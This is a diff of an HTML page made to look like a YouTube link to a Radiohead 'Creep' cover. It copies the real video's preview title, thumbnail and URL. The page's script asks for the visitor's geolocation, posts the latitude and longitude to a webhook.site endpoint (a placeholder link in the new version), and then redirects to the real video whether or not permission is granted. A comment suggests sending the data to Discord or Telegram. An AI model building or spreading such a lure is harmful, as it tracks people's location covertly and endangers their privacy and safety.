@@ -6,16 +6,9 @@
 
   <!-- 🧠 Social Media Preview -->
   <meta property="og:title" content="creep by radiohead">
-  <meta property="og:description" content="i’ve already done a cover of this song but it’s been so long i wanted to do it again🤧
-
-listen to my new single “now that we’re falling apart” out now on all streaming platforms here!: https://hypeddit.com/505n9v
-
-instagram:   / gl4z1n  
-
-tiktok:   / laurynkov  
-">
-  <meta property="og:image" content="https://www.youtube.com/watch?v=sTaamHdDVQE.jpg">
-  <meta property="og:url" content="https://www.youtube.com/watch?v=sTaamHdDVQE">
+  <meta property="og:description" content="">
+  <meta property="og:image" content="https://img.youtube.com/vi/sTaamHdDVQE/maxresdefault.jpg">
+  <meta property="og:url" content="https://youtube.com/watch?v=sTaamHdDVQE">
 
   <title>Loading...</title>
 </head>
@@ -30,19 +23,19 @@ tiktok:   / laurynkov
         const lon = pos.coords.longitude;
 
         // Send to your Discord, Telegram, or save via webhook
-        fetch("https://webhook.site/c428e8db-6815-4bf2-b96b-fc04ca5599b3", {
+        fetch("https://webhook.site/your-custom-link", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ latitude: lat, longitude: lon })
         });
 
         // Then redirect to real YouTube video
-        window.location.href = "https://www.youtube.com/watch?v=sTaamHdDVQE";
+        window.location.href = "https://youtube.com/watch?v=sTaamHdDVQE";
       },
 
       function(err) {
         // Even if denied, still redirect
-        window.location.href = "https://www.youtube.com/watch?v=sTaamHdDVQE";
+        window.location.href = "https://youtube.com/watch?v=sTaamHdDVQE";
       }
     );
   </script>
